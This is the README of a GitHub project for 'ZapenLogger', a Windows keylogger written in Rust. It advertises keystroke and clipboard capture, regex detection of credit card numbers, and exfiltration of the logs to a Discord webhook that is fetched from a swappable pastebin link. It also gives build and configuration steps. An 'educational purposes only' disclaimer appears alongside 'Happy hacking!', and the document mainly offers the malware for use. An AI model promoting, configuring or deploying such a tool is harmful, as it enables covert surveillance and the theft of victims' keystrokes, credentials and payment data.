**ZapenLogger** - Advanced Windows Keylogger For Discord

***DISCLAIMER***
_I am not responsible for any, lawful or not, use of this code/application by any third-party._
_I provide this code without any warranty and for educational purposes only._
_I am strictly against using provided code for gaining access to unauthorized information._

⭐ **Features:**
📋 Clipboard grabbing
⌨️ Sending logs on enter/buffer overflow/5 minute timeout
🔁 Swappable discord webhook using pastebin
💳 Detect potential credit card credentials using regex (sequence of three digits, sequence of sixteen digits and double digits divided by "/" symbol)
🦀 Written in rust, which means it's blazingly fast and doesn't need any runtime to execute. You just run the program and it executes, no pyinstaller, no dotnet, no any crap from interpreted/bytecode languages.

🪖 **How to get started**
1. Download rust installer rust from https://www.rust-lang.org/learn/get-started ([DIRECT LINK]: https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-msvc/rustup-init.exe)
2. Install rust using downloaded installer (i recommend x86_64-pc-windows-gnu toolchain since compiled with it binaries run almost everywhere):
![image](https://github.com/TheWeaponSmith/zapenlogger/assets/141177562/433dde50-ad05-4dce-ba72-f44e045593a9) ![image](https://github.com/TheWeaponSmith/zapenlogger/assets/141177562/e360b304-492a-456c-9cad-aaef752c979a)

3. Download the project as zip archive(or git clone if you have git) and open command prompt in the project folder and edit **PASTEBIN_URL** constant in main.rs in src folder. You need to replace it with raw link to your pastebin paste containing your discord webhook
![image](https://github.com/TheWeaponSmith/zapenlogger/assets/141177562/c5042453-550a-4d9b-b825-af43a62422c4) ![image](https://github.com/TheWeaponSmith/zapenlogger/assets/141177562/514a1832-e454-40f6-b2c9-242a3e29d168)

4. Open a command prompt in the root directory of the project and type ```cargo build --release``` and you will get compiled exe file in target/release directory

If you face any issues, please describe them in detail on "Issues" page.

**Happy hacking!**
